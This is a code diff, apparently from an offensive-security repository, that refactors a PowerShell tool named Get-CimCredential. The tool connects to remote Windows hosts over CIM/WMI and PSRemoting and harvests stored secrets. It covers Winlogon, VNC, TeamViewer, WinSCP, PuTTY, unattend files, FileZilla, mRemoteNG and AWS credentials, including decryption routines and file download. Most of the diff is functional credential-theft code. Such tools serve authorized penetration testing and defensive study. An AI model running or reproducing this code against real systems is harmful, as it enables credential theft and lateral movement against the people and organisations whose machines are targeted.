@@ -3,7 +3,7 @@
 Function Get-CimCredential {
 <#
 .SYNOPSIS
-    Get credentials stored on a remote computer.
+    Grab credentials stored on a remote computer.
     Privileges required: high
 
     Author: Timothée MENOCHET (@_tmenochet)
@@ -61,14 +61,24 @@ Function Get-CimCredential {
         $DownloadFiles
     )
 
-    BEGIN {
+    Begin {
+        # Optionally check host reachability
         if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
             Write-Verbose "[$ComputerName] Host is unreachable."
-            break
+            continue
         }
 
+        # Init variables
         $cimOption = New-CimSessionOption -Protocol $Protocol
         $psOption = New-PSSessionOption -NoMachineProfile
+        $formatDefaultLimit = $global:FormatEnumerationLimit
+    }
+
+    Process {
+        # Prevent output truncation
+        $global:FormatEnumerationLimit = -1
+
+        # Init remote sessions
         try {
             if (-not $PSBoundParameters['ComputerName']) {
                 $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
@@ -91,40 +101,33 @@ Function Get-CimCredential {
         }
         catch [Management.Automation.PSArgumentOutOfRangeException] {
             Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
-            break
+            return
         }
         catch [Microsoft.Management.Infrastructure.CimException] {
             if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                 Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
-                break
+                return
             }
             if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                 Write-Verbose "[$ComputerName] Access denied."
-                break
+                return
             }
             else {
                 Write-Verbose "[$ComputerName] Failed to establish CIM session."
-                break
+                return
             }
         }
         catch [Management.Automation.Remoting.PSRemotingTransportException] {
             Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
-            break
+            return
         }
 
-        $formatDefaultLimit = $global:FormatEnumerationLimit
-        $global:FormatEnumerationLimit = -1 # Prevent output truncation
-    }
-
-    PROCESS {
-        # Common registry keys
-
+        # Process common registry keys
         Get-WinlogonCredentialRegistry -CimSession $cimSession
         Get-VncCredentialRegistry -CimSession $cimSession
         Get-TeamViewerCredentialRegistry -CimSession $cimSession
 
-        # User registry keys
-
+        # Process user registry keys
         [uint32]$HKU = 2147483651
         $SIDs = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=''} -CimSession $cimSession -Verbose:$false | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
         foreach ($SID in $SIDs) {
@@ -134,13 +137,11 @@ Function Get-CimCredential {
             Get-PuttyCredentialRegistry -CimSession $cimSession -SID $SID -DownloadFiles:$DownloadFiles -Credential $Credential -PSSession $psSession
         }
 
-        # Common files
-
+        # Process common files
         Get-UnattendCredentialFile -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
         Get-VncCredentialFile -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
 
-        # User files
-
+        # Process user files
         $userFiles = @{
             # Cloud credentials
             "AWS-KeyFile"               = "\.aws\credentials"
@@ -158,16 +159,14 @@ Function Get-CimCredential {
             # Sessions
             "MTPuTTy"                   = "\AppData\Roaming\TTYPlus\mtputty.xml"
         }
-
         Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
             $profilePath = $_.LocalPath
-
             Get-FilezillaCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
             Get-MRNGCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
             Get-ApacheDirectoryStudioCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
 
             foreach ($userFile in $userFiles.GetEnumerator()) {
-                $filePath = ($_.LocalPath + $userFile.Value) -replace '\\','\\'
+                $filePath = ($profilePath + $userFile.Value).Replace('\','\\')
                 $filter  = "Name='$filePath'"
                 $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter $filter -CimSession $cimSession -Verbose:$false
                 if ($file.Name) {
@@ -196,12 +195,15 @@ Function Get-CimCredential {
         }
     }
 
-    END {
-        Remove-CimSession -CimSession $cimSession
+    End {
+        # End remote sessions
+        if ($cimSession) {
+            Remove-CimSession -CimSession $cimSession
+        }
         if ($psSession) {
             Remove-PSSession -Session $psSession
         }
-
+        # Restore output limit
         $global:FormatEnumerationLimit = $formatDefaultLimit
     }
 }
@@ -265,7 +267,7 @@ Function Local:Get-VncCredentialRegistry {
         $SID
     )
 
-    BEGIN {
+    Begin {
         Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
             if ($EncryptedPassword.Length -lt 8) {
                 return ""
@@ -301,7 +303,7 @@ Function Local:Get-VncCredentialRegistry {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $commonKeys = @(
             "SOFTWARE\RealVNC\WinVNC4"
             "SOFTWARE\RealVNC\vncserver"
@@ -348,7 +350,7 @@ Function Local:Get-VncCredentialRegistry {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-TeamViewerCredentialRegistry {
@@ -361,7 +363,7 @@ Function Local:Get-TeamViewerCredentialRegistry {
         $SID
     )
 
-    BEGIN {
+    Begin {
         Function Local:Create-AesManagedObject() {
             $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
             $aesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
@@ -384,7 +386,7 @@ Function Local:Get-TeamViewerCredentialRegistry {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $commonKeys = @(
             "SOFTWARE\TeamViewer"
             "SOFTWARE\WOW6432Node\TeamViewer"
@@ -454,7 +456,7 @@ Function Local:Get-TeamViewerCredentialRegistry {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-WinScpCredentialRegistry {
@@ -468,7 +470,7 @@ Function Local:Get-WinScpCredentialRegistry {
         $SID
     )
 
-    BEGIN {
+    Begin {
         Function Local:Get-WinSCPDecryptedPassword($SessionHostname, $SessionUsername, $Password) {
             $CheckFlag = 255
             $Magic = 163
@@ -510,7 +512,7 @@ Function Local:Get-WinScpCredentialRegistry {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         [uint32]$HKU = 2147483651
         $regKey = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
         $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
@@ -540,7 +542,7 @@ Function Local:Get-WinScpCredentialRegistry {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-PuttyCredentialRegistry {
@@ -565,11 +567,11 @@ Function Local:Get-PuttyCredentialRegistry {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    BEGIN {
+    Begin {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         [uint32]$HKU = 2147483651
         $regKey = $SID + "\SOFTWARE\SimonTatham\PuTTY\Sessions"
         $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
@@ -578,7 +580,7 @@ Function Local:Get-PuttyCredentialRegistry {
             foreach ($session in $sessions) {
                 $location = "$regKey\$session"
                 if ($keyFile = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PublicKeyFile"} -CimSession $cimSession -Verbose:$false).sValue) {
-                    $filePath = $keyFile -replace '\\','\\'
+                    $filePath = $keyFile.Replace('\','\\')
                     $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$filePath'" -CimSession $cimSession -Verbose:$false
                     if ($file.Name) {
                         $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
@@ -613,7 +615,7 @@ Function Local:Get-PuttyCredentialRegistry {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-UnattendCredentialFile {
@@ -634,18 +636,16 @@ Function Local:Get-UnattendCredentialFile {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    BEGIN {
+    Begin {
         # Adapted from PrivescCheck's Get-UnattendSensitiveData by @itm4n
         Function Local:Get-UnattendSensitiveData {
-            [CmdletBinding()]
-            Param(
+            Param (
                 [Parameter(Mandatory=$true)]
                 [String]$Path
             )
 
             Function Local:Get-DecodedPassword {
-                [CmdletBinding()]
-                Param(
+                Param (
                     [Object]$XmlNode
                 )
 
@@ -719,7 +719,7 @@ Function Local:Get-UnattendCredentialFile {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $commonFiles = @(
             "C:\Windows\Panther\Unattended.xml"
             "C:\Windows\Panther\Unattend.xml"
@@ -730,7 +730,7 @@ Function Local:Get-UnattendCredentialFile {
         )
 
         foreach ($commonFile in $commonFiles) {
-            $filePath = ($commonFile) -replace '\\','\\'
+            $filePath = $commonFile.Replace('\','\\')
             $filter  = "Name='$filePath'"
             $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
             if ($file.Name) {
@@ -766,7 +766,7 @@ Function Local:Get-UnattendCredentialFile {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-VncCredentialFile {
@@ -787,7 +787,7 @@ Function Local:Get-VncCredentialFile {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    BEGIN {
+    Begin {
         Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
             if ($EncryptedPassword.Length -lt 8) {
                 return ""
@@ -823,7 +823,7 @@ Function Local:Get-VncCredentialFile {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $commonFiles = @(
             "C:\Program Files\UltraVNC\ultravnc.ini"
             "C:\Program Files (x86)\UltraVNC\ultravnc.ini"
@@ -832,7 +832,7 @@ Function Local:Get-VncCredentialFile {
         )
 
         foreach ($commonFile in $commonFiles) {
-            $filePath = ($commonFile) -replace '\\','\\'
+            $filePath = $commonFile.Replace('\','\\')
             $filter  = "Name='$filePath'"
             $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
             if ($file.Name) {
@@ -884,7 +884,7 @@ Function Local:Get-VncCredentialFile {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-FilezillaCredentialFile {
@@ -909,18 +909,18 @@ Function Local:Get-FilezillaCredentialFile {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    BEGIN {
+    Begin {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $userFiles = @(
             "\AppData\Roaming\FileZilla\sitemanager.xml"
             "\AppData\Roaming\FileZilla\recentservers.xml"
         )
 
         foreach ($userFile in $userFiles) {
-            $filePath = ($ProfilePath + $userFile) -replace '\\','\\'
+            $filePath = ($ProfilePath + $userFile).Replace('\','\\')
             $filter  = "Name='$filePath'"
             $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
             if ($file.Name) {
@@ -965,7 +965,7 @@ Function Local:Get-FilezillaCredentialFile {
 
                             if ($keyFile) {
                                 # Download key file
-                                $keyFilePath = $keyFile -replace '\\','\\'
+                                $keyFilePath = $keyFile.Replace('\','\\')
                                 $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$keyFilePath'" -CimSession $cimSession -Verbose:$false
                                 if ($file.Name) {
                                     $cred["KeyFile"] = $keyFile
@@ -996,7 +996,7 @@ Function Local:Get-FilezillaCredentialFile {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-MRNGCredentialFile {
@@ -1021,7 +1021,7 @@ Function Local:Get-MRNGCredentialFile {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    BEGIN {
+    Begin {
         Function Local:Get-MRNGCredential ([Xml.XmlElement] $Node) {
             $Node.ChildNodes | ForEach-Object {
                 if ($_.Type -eq 'Connection' -and $_.Password) {
@@ -1044,7 +1044,7 @@ Function Local:Get-MRNGCredentialFile {
         # Adapted from PSmRemoteNG powershell module by @realslacker
         Function Local:ConvertFrom-MRNGSecureString {
             [OutputType([string])]
-            param(
+            Param (
                 [Parameter(Mandatory)]
                 [ValidateNotNullOrEmpty()]
                 [string]
@@ -1109,9 +1109,9 @@ Function Local:Get-MRNGCredentialFile {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $userFile = "\AppData\Roaming\mRemoteNG\confCons.xml"
-        $filePath = ($ProfilePath + $userFile) -replace '\\','\\'
+        $filePath = ($ProfilePath + $userFile).Replace('\','\\')
         $filter  = "Name='$filePath'"
         $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
         if ($file.Name) {
@@ -1157,7 +1157,7 @@ Function Local:Get-MRNGCredentialFile {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-ApacheDirectoryStudioCredentialFile {
@@ -1182,13 +1182,13 @@ Function Local:Get-ApacheDirectoryStudioCredentialFile {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    BEGIN {
+    Begin {
         $ComputerName = $CimSession.ComputerName
     }
 
-    PROCESS {
+    Process {
         $userFile = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
-        $filePath = ($ProfilePath + $userFile) -replace '\\','\\'
+        $filePath = ($ProfilePath + $userFile).Replace('\','\\')
         $file = Get-CimInstance -Class CIM_LogicalFile -Filter "Name='$filePath'" -CimSession $CimSession -Verbose:$false
         if ($file.Name) {
             $result = New-Object -TypeName PSObject
@@ -1238,11 +1238,10 @@ Function Local:Get-ApacheDirectoryStudioCredentialFile {
         }
     }
 
-    END {}
+    End {}
 }
 
 Function Local:Get-RemoteFile {
-    [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $True)]
         [String]
@@ -1265,7 +1264,7 @@ Function Local:Get-RemoteFile {
         $PSSession
     )
 
-    BEGIN {
+    Begin {
         Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
             $stringBuilder = New-Object System.Text.StringBuilder 
             [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
@@ -1275,7 +1274,7 @@ Function Local:Get-RemoteFile {
         }
     }
 
-    PROCESS {
+    Process {
         if ($PSSession) {
             # Download file via PSRemoting
             Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
@@ -1296,7 +1295,7 @@ Function Local:Get-RemoteFile {
         }
     }
 
-    END {}
+    End {}
 }
 
 # Bouncy Castle library adapted from https://github.com/mRemoteNG/mRemoteNG
